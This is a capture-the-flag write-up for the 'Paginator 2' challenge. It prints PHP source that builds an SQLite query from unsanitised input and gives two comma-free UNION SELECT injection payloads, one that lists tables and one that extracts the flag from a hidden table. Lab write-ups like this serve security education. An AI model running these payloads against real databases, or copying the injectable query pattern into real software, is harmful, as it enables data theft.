## Paginator 2

We have almost the same code but it has the flag in another table which we dont know about.

```php
<?php
ini_set("error_reporting", 1);
ini_set("display_errors",1);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php"; // Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');

try{
  $db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
  $db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
  //var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
  [$min, $max] = explode(",",$_GET['p']);
  if(intval($min) <= 1 ) {
    die("This post is not accessible...");
  }
  try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
      echo $row['title'] . " (ID=". $row['id'] . ") has content: \"" . $row['content'] . "\"<br>";
    }
  }catch(Exception $e) {
    echo "Try harder!";
  }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator v2</title>
    </head>
    <body>
        <h1>Paginator v2</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>

```

This has the same SQL injection as the previous chal but we cant use commas(,) because the do a split `[$min, $max] = explode(",",$_GET['p']);`
So we need to execute a union to get the flag from other table but without comma. This tricky because a union needs to have the same number o columns of the original query. To get the flag we first executed the following query to get the tables that exist: 

```
3 UNION  SELECT * FROM (SELECT name FROM dbname.sqlite_master) UT1 JOIN  (SELECT id FROM pages WHERE content > 'A' AND content < 'U') UT2 JOIN (SELECT id FROM pages WHERE content > 'A' AND content < 'U') UT3;
```


Then we get the flag with: 
```
3 UNION  SELECT * FROM (SELECT value from flag) UT1 JOIN  (SELECT id FROM pages WHERE content > 'A' AND content < 'U') UT2 JOIN (SELECT id FROM pages WHERE content > 'A' AND content < 'U') UT3;
```